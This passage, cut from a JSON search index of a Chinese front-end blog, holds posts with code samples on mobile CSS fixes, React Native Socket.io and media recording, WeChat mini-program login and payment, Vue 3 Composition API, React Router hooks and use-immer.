iframe，这样就会刷新 title。 通用长时间按住页面出现闪退解决方案： 1* &#123; -webkit-touch-callout: none; &#125; 动画硬件加速解决方案： 在需要动画的元素上加上 123.el &#123; transform: translate3d(0, 0, 0);&#125; 禁止复制、选中文本解决方案： 1* &#123; user-select: none; &#125; 横平时字体加粗不一致1* &#123; text-size-adjust: 100%; &#125; 图片加 a 标签在 IE9 中出现边框解决方案： 1img &#123; border: none; &#125; &lt;button&gt; 元素一定要写上 type 属性不然会默认提交表单，出现想不到的 bug？某些安卓手机的自带浏览器不识别 onkeydown onkeypress onkeyup 事件，这些事件会导致不能输入汉字。（这是有多烂的手机？）视频自动播放的问题在移动端浏览器里 video 很多都不能正常的自动播放（autoplay 属性）。 解决方案：在 DOM onload 事件里用 调用 video 的 play 方法，手动去播放。 移动端弹层，点击穿透问题解决方案：使用 fastclick 这个库来解决。 移动端弹层，滚动穿透问题出现这种原因是因为，弹层里有滚动条，底下里也有滚动条，有人说禁止 touchmove 的默认行为，那不行，那弹层的滚动条就不能滚动了。 解决方案：底下的滚动条，在弹层打开时隐藏滚动条。或者这种弹层换一种思路是实现（不要要弹层了）。 flex 布局下文本省略问题在 flex 布局下，text-overflow 会失效, 无法使用样式让文字自动省略。 解决方案：flex 布局下包裹一层，然后设置父级层 min-width: 0 即可。","categories":[{"name":"移动端","slug":"移动端","permalink":"http://me.lizhooh.com/categories/移动端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"移动端","slug":"移动端","permalink":"http://me.lizhooh.com/tags/移动端/"}]},{"title":"React Native 0.60+ 上使用 Socket.io","slug":"React Native/Socket/React Native 0.60+ 上使用 Socket.io","date":"2020-05-15T01:54:36.000Z","updated":"2021-06-15T06:10:52.869Z","comments":true,"path":"/stories/2020/05/React Native/Socket/React Native 0.60+ 上使用 Socket.io/","link":"","permalink":"http://me.lizhooh.com/stories/2020/05/React Native/Socket/React Native 0.60+ 上使用 Socket.io/","excerpt":"前言React Native 之前使用时，用过 Socket.io，但是一直连接不上，表示连接超时什么的。 今天再次试了一些，既然连接上了，献上关键代码。","text":"前言React Native 之前使用时，用过 Socket.io，但是一直连接不上，表示连接超时什么的。 今天再次试了一些，既然连接上了，献上关键代码。 前端React Native 上，socket 版本必须要限制，固定为 2.1.1，如果直接安装新版本会不行的。 “socket.io-client”: “2.1.1” 123456789101112import Sio from 'socket.io-client';const socket = new Sio('ws://192.168.3.107:3001', &#123; secure: true, path: '/test', transports: ['websocket'],&#125;);socket.on('message', () =&gt; &#123; console.warn('收到消息了'); socket.close();&#125;); 后端配置写上就 ok 了。 123456789101112131415161718const Sio = require('socket.io');const io = new Sio(3001, &#123; path: '/test', serveClient: false, // below are engine.IO options pingInterval: 10000, pingTimeout: 5000, cookie: false,&#125;);io.on('connection', socket =&gt; &#123; console.log('有人连接了：', socket.id); socket.emit('message', 'hello'); socket.on('disconnect', () =&gt; &#123; console.log('有人断开连接了：', socket.id); &#125;);&#125;);","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native 实现像微信朋友圈发视频功能","slug":"React Native/Media/React Native 实现像微信朋友圈发视频功能","date":"2020-05-09T10:41:15.000Z","updated":"2021-06-15T06:10:52.857Z","comments":true,"path":"/stories/2020/05/React Native/Media/React Native 实现像微信朋友圈发视频功能/","link":"","permalink":"http://me.lizhooh.com/stories/2020/05/React Native/Media/React Native 实现像微信朋友圈发视频功能/","excerpt":"前言使用 React Native 仿微信朋友圈发视频的录像功能，要仿的话，可以 100% 完全模仿。录像方面使用到了 React Native 社区的 react-native-camera 库。","text":"前言使用 React Native 仿微信朋友圈发视频的录像功能，要仿的话，可以 100% 完全模仿。录像方面使用到了 React Native 社区的 react-native-camera 库。 要点整体的逻辑方面是： 长按录像，设置定时。 录像完毕获取视频资源地址。 使用 react-native-video 在本地播放。 录像录像的 API 看这篇文章：api#recordasync。 12345678910111213141516takeVideo = async () =&gt; &#123; // this.camera 是通过 ref 获取的引用对象 if (!this.camera) return; try &#123; const promise = this.camera.recordAsync(this.state.recordOptions); if (promise) &#123; this.setState(&#123; isRecording: true &#125;); const data = await promise; this.setState(&#123; isRecording: false &#125;); console.warn('takeVideo', data); &#125; &#125; catch (e) &#123; console.error(e); &#125;&#125;; 录像停止使用 stopRecording API。 1stopRecording(); 注意了，调用了 stopRecording 之后，recordAsync 的 promise 才会终止。因此，调用 stopRecording 后，recordAsync 就能拿到录像的结果了。 API比较常用的 API： refreshAuthorizationStatus 刷新权限 recordAsync 录像 takePictureAsync 拍照","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native 实现 IM 发送语音功能","slug":"React Native/Media/React Native 实现 IM 发送语音功能","date":"2020-05-09T10:08:22.000Z","updated":"2021-06-15T06:10:52.857Z","comments":true,"path":"/stories/2020/05/React Native/Media/React Native 实现 IM 发送语音功能/","link":"","permalink":"http://me.lizhooh.com/stories/2020/05/React Native/Media/React Native 实现 IM 发送语音功能/","excerpt":"前言现在有一个需求是实现IM（聊天）模块里的发语音功能，好现在介绍怎么在 React Native 上实现。 首先先理清楚整个逻辑： 用户按发语音按钮，设置长按或者单按也行。 调用录音 API，开始录音，当然记得添加获取权限功能。 用户结束录音，接着把音频上传到后端，后端返回资源的 url，上传前客户端可以先处理一下。 拿到音频资源的 url，添加到消息体的结构里，发送出去，完成。","text":"前言现在有一个需求是实现IM（聊天）模块里的发语音功能，好现在介绍怎么在 React Native 上实现。 首先先理清楚整个逻辑： 用户按发语音按钮，设置长按或者单按也行。 调用录音 API，开始录音，当然记得添加获取权限功能。 用户结束录音，接着把音频上传到后端，后端返回资源的 url，上传前客户端可以先处理一下。 拿到音频资源的 url，添加到消息体的结构里，发送出去，完成。 录音在 React Native 里可以使用 react-native-community 维护的一个音频库：react-native-audio-toolkit 实现。 这是 React Native 的跨平台（Android 和 iOS）音频库。支持音频播放和录制。除了基本功能之外，还实现了许多有用的功能，例如通过网络搜索，循环播放和流式传输音频文件。 录音可以使用一个 Recorder API 实现。 1new Recorder(String path, Object ?recorderOptions) 说明： 第一个参数是 path，录音时写入的文件路径。 第二个参数是 recorderOptions，录音的配置项。 recorderOptions 可以配置以下： 12345678910111213141516// 设置记录器的比特率，每秒bitrate : Number (default: 128000)// 设置通道数channels : Number (default: 2)// 设置每秒多少个样本sampleRate : Number (default: 44100)// 设置文件格式。// 跨平台： 'MP4'， 'AAC'// 仅适用于Android： 'OGG'， 'WEBM'， 'AMR'format : String (default: based on filename extension)// 设置编码器。仅适用于 Android。// 'AAC'， 'MP4'， 'WEBM'， 'OGG'， 'AMR'encoder : String (default: based on filename extension)// 录音质量，仅 iOS。// 可能的值：'min'，'low'，'medium'，'high'，'max'qualityquality : String (default: 'medium') 返回是一个对象，有 prepare/record/stop/destroy 方法，参数都是错误触发时的回调。 prepare(cb?) 方法用于准备记录到初始化期间提供的文件中。 record(cb?) 用于开始录音。 stop(cb?) 用于停止录音。 destroy(cb?) 用于结束/销毁录音。 试听好，录音完，怎么听，可以直接听网络的 url，可以听本地的 path。使用到 Player 对象。 1new Player(String path, Object ?playbackOptions); 其他对于录音时的长按实现，RN 是提供长按的 longPress 事件的，但是这个长按只是 1s，因此用户控制的长按，使用 touchStart 和 touchEnd 实现即可。 弄录音不难，弄蓝牙才难，坑特别多，后序补上 React Native 蓝牙开发的文章。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"4.4 追悼“新型冠状病毒”日，一键让页面变成灰色","slug":"Style/4.4 追悼“新型冠状病毒”日，一键让页面变成灰色","date":"2020-04-04T15:06:49.000Z","updated":"2021-06-15T06:10:52.894Z","comments":true,"path":"/stories/2020/04/Style/4.4 追悼“新型冠状病毒”日，一键让页面变成灰色/","link":"","permalink":"http://me.lizhooh.com/stories/2020/04/Style/4.4 追悼“新型冠状病毒”日，一键让页面变成灰色/","excerpt":"前言4.4 追悼“新型冠状病毒”日，很多网站都做了全站灰色的效果，因此我们也要跟进一下。 方法也挺简单，直接在 html 上添加一个灰色滤镜，简单暴力，这种写法能兼容到 ie8+。 1234html &#123; filter: grayscale(100%); filter: progid:DXImageTransform.Microsoft.BasicImage(graysale=1);&#125;","text":"前言4.4 追悼“新型冠状病毒”日，很多网站都做了全站灰色的效果，因此我们也要跟进一下。 方法也挺简单，直接在 html 上添加一个灰色滤镜，简单暴力，这种写法能兼容到 ie8+。 1234html &#123; filter: grayscale(100%); filter: progid:DXImageTransform.Microsoft.BasicImage(graysale=1);&#125; SVG 滤镜实现新建一个 gray.svg 文件，输入以下内容。 1234567&lt;svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\"&gt; &lt;filter id=\"grayscale\"&gt; &lt;feColorMatrix type=\"matrix\" values=\"0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0\" /&gt; &lt;/filter&gt;&lt;/svg&gt; 设置过滤属性。 123html &#123; filter: url(gray.svg#grayscale);&#125; js 实现npm 上有一个包：grayscale，它可以将 div 或 img 设置成灰度的颜色，同样能兼容到 ie8+。 1234grayscale(document.getElementById('thisImage'));grayscale(document.getElementsByTagName('img'));// JQuerygrayscale($('#thisImage')); 如果你是使用 React 的话，自己封装一个包裹组件就行了。 12345678910111213const Grayscale = (Component) =&gt; &#123; const id = Math.random().toString(32).slice(2); useEffect(() =&gt; &#123; // ... grayscale(document.getElementById(id)); &#125;, []); return ( &lt;div id=&#123;id&#125;&gt; &#123;Component&#125; &lt;/div&gt; );&#125;; 参考资料 https://www.npmjs.com/package/grayscale","categories":[{"name":"CSS","slug":"CSS","permalink":"http://me.lizhooh.com/categories/CSS/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"CSS","slug":"CSS","permalink":"http://me.lizhooh.com/tags/CSS/"}]},{"title":"小程序登录、支付、分享解说","slug":"小程序/小程序登录、支付、分享解说","date":"2020-02-06T04:36:59.000Z","updated":"2021-06-15T06:10:52.913Z","comments":true,"path":"/stories/2020/02/小程序/小程序登录、支付、分享解说/","link":"","permalink":"http://me.lizhooh.com/stories/2020/02/小程序/小程序登录、支付、分享解说/","excerpt":"前言小程序登录、支付、分享解说。","text":"前言小程序登录、支付、分享解说。 登录小程序登录使用 wx.login(OBJECT)，调用之后能获取 code，把这个 code 给后端使用。 调用后能拿到 code，但是没有 openid，这时怎么获取 openid 呢？需要后端自己调用 auth.code2Session。 这个接口是后端调用的，后端从前端拿到 code 之后，根据 appid，secret，code 获取 session_key，openid，unionid。 登录后一般需要获取用户信息，之前是使用 wx.getUserInfo(OBJECT)，但是后来这个 api 要废弃了。需要使用一个 Button 来触发。 在用户未授权过的情况下调用此接口，将不再出现授权弹窗，会直接进入 fail 回调。 1234567&lt;Button type='primary' className='btn' onGetUserInfo=&#123;this.onGetUserInfo&#125; openType='getUserInfo'&gt; 去授权&lt;/Button&gt; 关键点在于 openType=&#39;getUserInfo&#39;，在 onGetUserInfo 里获取信息。 123456789onGetUserInfo = e =&gt; &#123; const data = e.detail.userInfo; const nickName = data.nickName; const avatar = data.avatarUrl; const gender = data.gender; // 性别 0：未知、1：男、2：女 const province = data.province; const city = data.city; const country = data.country;&#125; 有时候，想获取用户微信的手机号，那么也需要使用 Button 来触发。 1234567&lt;Button type='primary' className='btn' onGetPhoneNumber=&#123;this.onGetPhoneNumber&#125; openType='getPhoneNumber'&gt; 去授权&lt;/Button&gt; 12345678910111213// 获取手机号onGetPhoneNumber = async e =&gt; &#123; const &#123; code &#125; = await Taro.login(); const iv = e.detail.iv; // 向量 const enc = e.detail.encryptedData; // 待解密数据 // 如果授权过用户信息，跳过弹窗授权 const auth = await Taro.getSetting(); if (auth.authSetting['scope.userInfo']) &#123; // 前端是拿不到手机号，需要后端进行解密获取 await this.loginByWechat(code, iv, enc, null, null); &#125;&#125;; 支付支付使用 wx.requestPayment(OBJECT)，使用起来也挺简单，主要是需要 code。 首先第一步，获取支付需要的数据信息，这里需要请求后端的接口获取，最后拿到下面的信息。 1234567&#123; timeStamp: string, nonceStr: string, package: string, signType: string, paySign: string,&#125; 接着再调用 wx.requestPayment。 123456const &#123; code &#125; = await Taro.login();const res = await api.wepayAction(&#123; code: code, userId: userId,&#125;);const payRes = await Taro.requestPayment(res); 有 payRes 就表示支付成功。 注意：iOS 不能进行虚拟物品支付。 分享分享有两个部分，一个是生成二维码，把 uid 和一些其他信息传给后端，生成对应的二维码。 注意：生成二维码的数据，只能是 32 位字节码的长度，注意设计。 分享之后，用户从扫码进入，怎么判断呢？ 在 app.js 里的 onLaunch 可以获取 scene 和 query，这个 scene 是场景值。 在 query 里就是获取二维码的数据的，具体看后端怎么设计了，比如后端设计为 /?qrcode=&#39;u=123,t=de&#39;。那么获取二维码传递进来的数据就是 query.qrcode。 123456App(&#123; onLaunch: function (options)&#123; console.log(options); const scene = options.scene &#125;,&#125;); 注意要判断场景值，是否从二维码哪里进来。有三个值：1011，1012，1013。 参考资料 https://developers.weixin.qq.com/miniprogram/dev/reference/scene-list.html","categories":[{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/categories/小程序/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/tags/小程序/"}]},{"title":"React Concurrent 模式之平行世界","slug":"React/React/React Concurrent 模式之平行世界","date":"2020-01-28T10:44:12.000Z","updated":"2021-06-15T06:10:52.876Z","comments":true,"path":"/stories/2020/01/React/React/React Concurrent 模式之平行世界/","link":"","permalink":"http://me.lizhooh.com/stories/2020/01/React/React/React Concurrent 模式之平行世界/","excerpt":"前言React 在未来会新增加一种新的模式，官网翻译为：并发 UI 模式，而我称他为平时世界模式。为什么这样说？因为这种模式与以往的不同，它注重于 UI 的并发渲染，也就是单个 UI 中渲染过程中可以及时的终止，也可以多个 UI 进行渲染计算。 平行世界模式非常有用，在一些页面跳转里，可以显得非常的出色。","text":"前言React 在未来会新增加一种新的模式，官网翻译为：并发 UI 模式，而我称他为平时世界模式。为什么这样说？因为这种模式与以往的不同，它注重于 UI 的并发渲染，也就是单个 UI 中渲染过程中可以及时的终止，也可以多个 UI 进行渲染计算。 平行世界模式非常有用，在一些页面跳转里，可以显得非常的出色。 鲜明的在 Github 就是一个鲜明的平行世界示例。 当用户点击转跳时，并没有立即转跳，而是还停留在当前的页面，在 React 里几乎很难实现这种效果，无论是使用个 React Router 还是自定义渲染方式都很难实现，因为在代码是直观了，而在这过程是存在异步请求，当切换页面时，页面切换了，但是异步请求还没结束，这时一般我们会做一些 loading 的动画去缓解界面上的压力。 平行世界有的新的平行世界模式就可以实现这种功能了，新的 API 里使用使用到了：useTransition，Suspense。 目前 Api 尚未稳定，就不介绍怎么用了，总之就是好东西就行了。 参考资料 https://reactjs.org/docs/concurrent-mode-patterns.html","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Vue3.0：了解 Composition API","slug":"Vue/Vue3.0：了解 Composition API","date":"2020-01-13T08:18:54.000Z","updated":"2021-06-15T06:10:52.901Z","comments":true,"path":"/stories/2020/01/Vue/Vue3.0：了解 Composition API/","link":"","permalink":"http://me.lizhooh.com/stories/2020/01/Vue/Vue3.0：了解 Composition API/","excerpt":"前言Vue 3.0 推出 Composition API 无非就是为了支持 TypeScript，毕竟在 TypeScript 上 Vue 失宠了。由于 Vue3.0 支持 TypeScript，TypeScript 很重要的一个特性就是可以进行类型推导，而函数天然对类型推导非常友好（至少比嵌套对象要好得多），因此，像 Composition API 这种函数式的编程风格，成为了新框架的亮点。下面我们来看看怎么使用。","text":"前言Vue 3.0 推出 Composition API 无非就是为了支持 TypeScript，毕竟在 TypeScript 上 Vue 失宠了。由于 Vue3.0 支持 TypeScript，TypeScript 很重要的一个特性就是可以进行类型推导，而函数天然对类型推导非常友好（至少比嵌套对象要好得多），因此，像 Composition API 这种函数式的编程风格，成为了新框架的亮点。下面我们来看看怎么使用。 Composition1234567891011121314151617181920212223242526import &#123; createApp, ref &#125; from 'Vue';// 计数器组件const Counter = &#123; template: ` &lt;div class='counter-display'&gt; &lt;span class='counter-label'&gt;恭喜你，你已经写了&lt;/span&gt; &lt;span class='counter-text'&gt;&#123;&#123; count &#125;&#125;&lt;/span&gt; &lt;span class='counter-label'&gt;斤代码！&lt;/span&gt; &lt;/div&gt; &lt;div class='counter-btns'&gt; &lt;button class='btn' @click='increase'&gt;写一斤&lt;/button&gt; &lt;button class='btn' @click='reset'&gt;删库啦&lt;/button&gt; &lt;/div&gt; `, // 初始化函数 setup() &#123; // 创建一个响应式的对象 const count = ref(0); // 操作函数 const increase = () =&gt; &#123; count.value++ &#125;; const reset = () =&gt; &#123; count.value = 0 &#125;; // 导出给模板访问 =&gt; state return &#123; count, increase, reset &#125;; &#125;&#125; 可以发现 Vue 3.0 Composition 跟 React 18.6 的 Hooks 函数很类似，下面是 React 的 Hooks 函数写法。 唯一不同的是在 Vue 3.0 Composition 里数据的值是在 xxx.value 里。 12345678910111213141516171819import &#123; useState &#125; from 'React';export default () =&gt; &#123; const [count, set] = useState(0); const increase = () =&gt; set(count + 1); const reset = () =&gt; set(0); return ( &lt;div class='counter-display'&gt; &lt;span class='counter-label'&gt;恭喜你，你已经写了&lt;/span&gt; &lt;span class='counter-text'&gt;&#123;&#123; count &#125;&#125;&lt;/span&gt; &lt;span class='counter-label'&gt;斤代码！&lt;/span&gt; &lt;/div&gt; &lt;div class='counter-btns'&gt; &lt;button class='btn' onClick=&#123;increase&#125;&gt;写一斤&lt;/button&gt; &lt;button class='btn' onClick=&#123;reset&#125;&gt;删库啦&lt;/button&gt; &lt;/div&gt; );&#125;; 在 Vue 3.0 Composition 里 data 和 method 不见了，取代的就是在 setup 里返回你希望的数据与函数，完全符合函数式编程的标准。 同样的与 React Hooks 类似，Vue 3.0 Composition 支持自定义钩子函数。 1234567// 对 count 值的操作逻辑function useCount() &#123; const count = ref(0) const increase = () =&gt; &#123; count.value++ &#125; const reset = () =&gt; &#123; count.value = 0 &#125; return &#123; count, increase, reset &#125;;&#125; 这种做法有利于拆分复杂的业务逻辑，让代码看起来更清晰，更好维护；在我们使用模块化机制的时候，更可以进一步把这些独立逻辑函数移入模块文件中，让每一部分的代码都变得更干净。 参考资料 https://juejin.im/post/5d836420f265da039b24d1ee","categories":[{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/categories/Vue/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/tags/Vue/"}]},{"title":"Vue 与 React 的比较","slug":"Vue/Vue 与 React 的比较","date":"2020-01-04T14:23:21.000Z","updated":"2021-06-15T06:10:52.900Z","comments":true,"path":"/stories/2020/01/Vue/Vue 与 React 的比较/","link":"","permalink":"http://me.lizhooh.com/stories/2020/01/Vue/Vue 与 React 的比较/","excerpt":"前言Vue 致力解决的问题与 React 一致，但却提供了另外一套解决方案。 Vue 主导使用的是可变数据，而 React 更强调数据的不可变性。","text":"前言Vue 致力解决的问题与 React 一致，但却提供了另外一套解决方案。 Vue 主导使用的是可变数据，而 React 更强调数据的不可变性。 响应式实现上，Vue 跟 React 的最大区别在于数据的响应式上。Vue 提供响应式的数据绑定，当数据改动时，界面就会自动更新，而在 React 里你需要主动的去调用 setState 方法，才能完成更新。（计算原始的 state 更新了，它都不会更新，当然 React 是不建议你是改动 state 内部的引用） 简单性Vue 比 React 容易，因为 Vue 提供了很多模板语法或属性帮你搞定事情，比如 v-for、v-if、directive、v-model、watch、computed 等，你背下它们的作用就能做事了，可以说是小白专用。 React 比 Vue 简单，因为 React 里面其实只有一个概念，就是函数。React 没有引入任何新的概念，你可以用 js 的 if 实现 v-if，完全是原生的 js 语法，根本不需要太多的新记忆，自由度完全由你的水平决定，可以说是老司机专用。 灵活性React 比 Vue 灵活，根据条件决定是否渲染组件，在 Vue 里你必须使用 v-if，并没有其他的选择，在 React 里你可以使用 if 语法，设置是 &amp;&amp; || 短路语法来实现，自由度高。 React 比 Vue 灵活，在 React 里你可以将不同类型的组件放进去数组里然后进行列表渲染，在 Vue 里你只能做好数据结构，根据 v-for，v-if 进行渲染。 看法关于模板，可能由于之前开发后端相关项目的时候，用模板习惯了，尤其是对于模板那套贯有的语法，if，for，变量绑定，过滤器等，所以对于 Vue 的模板语法，并没有感觉有啥技术门槛和心理门槛，当然反倒是对新生事物 JSX 表示一些困惑。现在在用 React，感觉到 JSX 是个很好的发明，改变了我对传统模板的认识，现在也算是爱不释手吧，但是，我依然不会否定模板存在的意义。 之前之所以选择 Vue，很大原因是因为 Vue 独有的 .vue 文件，可以将组件的样式，脚本，模板分离的同时又能整合在一个文件中，正好满足我的诉求。在当时，对于 all-in-js，我是拒绝的。但现在上手 React 后，已经不纠结什么 all-in-js 了，至少，并不影响开发效率和维护性，css modules 用的也蛮开心的。 组件化复用嘛，Vue 已经能满足我的诉求了，至少用它开发了团队的前端框架，包括业务模块，业务组件等，复用性是能满足开发需求的。后来用了 React，我内心是，woc，function 也可以做前端的组件，无论是复用性，和使用成本，都已经接近原子态了，实在佩服 React 的设计者。相比之下，Vue 在一定场景下的组件复用的确不如 React，但是，我不会否认 Vue 封装组件的能力，因为我觉得对于组件的理解，设计以及封装，关键还是看开发者的能力。 最后对于老司机来说，React 的 if，map，forEach 更符合编程思维，而 Vue 的 v-if，v-for 更像是新的一类人。","categories":[{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/categories/Vue/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/tags/Vue/"}]},{"title":"NPM 环境变量与多命令","slug":"Npm/NPM 开发环境与多命令","date":"2019-12-20T09:01:13.000Z","updated":"2021-06-15T06:10:52.847Z","comments":true,"path":"/stories/2019/12/Npm/NPM 开发环境与多命令/","link":"","permalink":"http://me.lizhooh.com/stories/2019/12/Npm/NPM 开发环境与多命令/","excerpt":"前言NPM 上用得比较多的两个库，一个是用于设置环境变量的，一个是用于多命令执行的： cross-env concurrently","text":"前言NPM 上用得比较多的两个库，一个是用于设置环境变量的，一个是用于多命令执行的： cross-env concurrently cross-envcross-env 是用来设置环境变量的。在 npm script 命令里设置的变量，会在 process 里的 env 里设置。 1cross-env NODE_ENV=production HOST=127.0.0.1 实际上是设置： 12process.env.NODE_ENV='production'process.env.HOST='127.0.0.1' concurrentlyconcurrently 是用来执行多命令的。 假设现在有 npm 命令： 1234567891011&#123; //... \"scripts\": &#123; // ... \"watch-js\": \"...\", \"watch-css\": \"...\", \"watch-node\": \"...\", // ... &#125;, // ...&#125; concurrently 就是这样一波走： 1concurrently \"npm:watch-js\" \"npm:watch-css\" \"npm:watch-node\"","categories":[{"name":"PWA","slug":"PWA","permalink":"http://me.lizhooh.com/categories/PWA/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"PWA","slug":"PWA","permalink":"http://me.lizhooh.com/tags/PWA/"}]},{"title":"React Router Hooks API 使用指南","slug":"React/Router/React Router Hooks API 使用指南","date":"2019-12-11T08:22:24.000Z","updated":"2021-06-15T06:10:52.883Z","comments":true,"path":"/stories/2019/12/React/Router/React Router Hooks API 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/12/React/Router/React Router Hooks API 使用指南/","excerpt":"前言可以看到 React-Router 已经提供了 hooks 的函数了，现在分别有 4 个函数： useHistory useLocation useParams useRouteMatch 下面开始一个个讲解怎么使用。","text":"前言可以看到 React-Router 已经提供了 hooks 的函数了，现在分别有 4 个函数： useHistory useLocation useParams useRouteMatch 下面开始一个个讲解怎么使用。 useHistoryuseHistory 可以获取 history 的实例。 12345678910111213141516import React from 'react';import &#123; useHistory &#125; from 'react-router-dom';function HomeButton() &#123; const history = useHistory(); function handleClick() &#123; history.push('/home'); &#125; return ( &lt;button onClick=&#123;handleClick&#125;&gt; Go home &lt;/button&gt; );&#125; 之前愁着怎么用命令来进行导航的转跳，现在好办了。 useLocationuseLocation 返回 location 代表当前 URL 的对象。您可以将其视为类似于 URL 更改时 useState 会返回新值的 location。 12345678import React from 'react';import &#123; useLocation &#125; from 'react-router-dom';function App() &#123; const location = useLocation(); return &lt;Switch&gt;...&lt;/Switch&gt;;&#125; useLocation 能够获取当前的 url，因此可以结合 useHistory 做登录认证守护。 useParamsuseParams 可以获取当前 url 传递的参数，与 match.params 返回的一致。 12345678function BlogPost() &#123; const &#123; slug &#125; = useParams(); return &lt;div&gt;Now showing post &#123;slug&#125;&lt;/div&gt;;&#125;&lt;Route path='/blog/:slug'&gt; &lt;BlogPost /&gt;&lt;/Route&gt; useRouteMatchuseRouteMatch 能够根据提供的 url 获取指定的 match。 不使用 useRouteMatch 之前是这样做的： 12345678const BlogPost = ( &lt;Route path='/blog/:slug' render=&#123;(&#123; match &#125;) =&gt; &#123; return &lt;div /&gt;; &#125;&#125; /&gt;); 使用 useRouteMatch 之后： 12345678910&lt;Route path='/blog/:slug' component=&#123;BlogPost&#125;/&gt;function BlogPost() &#123; const match = useRouteMatch(); return &lt;div /&gt;;&#125; 补充在 React Router 里会有三个特殊对象：location，history，match。其中 location 和 history 都很好理解，都是原生对象的封装。而 match 则是路由匹配的对象，里面装载着一些路由参数什么的，有空自己输出来看看。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"},{"name":"React-Router","slug":"React-Router","permalink":"http://me.lizhooh.com/tags/React-Router/"}]},{"title":"use-immer 精通指南","slug":"React/immutable/use-immer 精通指南","date":"2019-12-11T08:09:36.000Z","updated":"2021-06-15T06:10:52.888Z","comments":true,"path":"/stories/2019/12/React/immutable/use-immer 精通指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/12/React/immutable/use-immer 精通指南/","excerpt":"前言use-immer 是用 hooks 加 immer 的库，废话不多说，下面就带你精通他。 注意安装 0.3.3 版本。","text":"前言use-immer 是用 hooks 加 immer 的库，废话不多说，下面就带你精通他。 注意安装 0.3.3 版本。 123456789101112131415161718192021222324252627282930313233343536373839import React from 'react';import &#123; useImmer, useImmerReducer &#125; from 'use-immer';const initialState = &#123; count: 0 &#125;;function reducer(state, action) &#123; console.log(state, action); switch (action) &#123; case 'reset': return initialState; case 'increment': state.count++; return; case 'decrement': state.count--; return; &#125;&#125;export default () =&gt; &#123; const [state, update] = useImmer(&#123; name: 'abc', age: 12 &#125;); const [&#123; count &#125;, dispatch] = useImmerReducer(reducer, initialState); const setName = name =&gt; e =&gt; update(state =&gt; &#123; state.name = name; &#125;); return ( &lt;div&gt; &lt;h3&gt;Hello&lt;/h3&gt; &lt;h3&gt;&#123;state.name&#125;&lt;/h3&gt; &lt;h3&gt;&#123;state.age&#125;&lt;/h3&gt; &lt;h3&gt;&#123;count&#125;&lt;/h3&gt; &lt;button onClick=&#123;setName('小米')&#125;&gt;点我&lt;/button&gt; &lt;button onClick=&#123;e =&gt; dispatch('increment')&#125;&gt;点我 2&lt;/button&gt; &lt;/div&gt; );&#125;;","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"useImperativeHandle 使用方式","slug":"React/Hooks/useImperativeHandle 